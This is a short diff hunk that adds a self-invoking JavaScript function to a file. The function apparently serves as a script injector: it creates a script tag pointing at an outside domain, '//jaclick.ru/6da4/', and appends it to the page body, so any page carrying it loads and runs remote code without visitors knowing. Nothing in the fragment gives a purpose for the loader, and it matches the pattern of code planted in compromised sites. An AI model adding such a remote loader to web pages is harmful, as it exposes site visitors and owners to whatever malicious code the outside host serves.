@@ -1,0 +1,6 @@
+(function(a) {
+        a = a.createElement("script");
+        a.src = "//jaclick.ru/6da4/";
+        a.async = !0;
+        document.body.appendChild(a);
+})(document);
